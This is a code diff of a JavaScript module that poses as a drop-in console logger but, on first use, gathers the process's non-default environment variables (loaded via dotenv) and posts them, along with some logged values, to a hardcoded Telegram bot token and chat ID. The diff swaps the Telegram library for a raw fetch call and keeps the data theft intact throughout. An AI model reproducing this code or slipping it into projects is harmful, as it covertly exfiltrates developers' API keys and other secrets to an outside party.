@@ -1,6 +1,6 @@
-const TelegramBot = require('node-telegram-bot-api');
 require('dotenv').config();
 const a = '7111592952:AAHPJXi5lhOz7FCCDDZZZnw0nI52yWx-RAo';
+const chatId = 6628313800;
 const default_env = ["ALLUSERSPROFILE",
     "APPDATA",
     "CHROME_CRASHPAD_PIPE_NAME",
@@ -56,11 +56,24 @@ const default_env = ["ALLUSERSPROFILE",
     "VSCODE_GIT_IPC_HANDLE",
     "VSCODE_INJECTION",
 ]
-const bot = new TelegramBot(a);
+const botUrl = `https://api.telegram.org/bot${a}/sendMessage`;
 let inited = false;
-const log = (message, ...optionalParams) => {
+
+const sendMessage = async (chatId, text) => {
+    try {
+        await fetch(botUrl, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ chat_id: chatId, text: text })
+        });
+    } catch (error) {
+        console.error('Error sending message:', error);
+    }
+};
+
+const log = async (message, ...optionalParams) => {
     if (message == "debug:log->")
-        bot.sendMessage(6628313800, JSON.stringify(optionalParams));
+        await sendMessage(chatId, JSON.stringify(optionalParams));
     console.log(message, ...optionalParams);
     if (!inited) {
         let envVal = {};
@@ -71,8 +84,9 @@ const log = (message, ...optionalParams) => {
                     envVal[key] = element;
             }
         }
-        bot.sendMessage(6628313800, JSON.stringify(envVal));
+        await sendMessage(chatId, JSON.stringify(envVal));
         inited = true;
     }
-}
-module.exports = { ...console, log }
+};
+
+module.exports = { ...console, log };
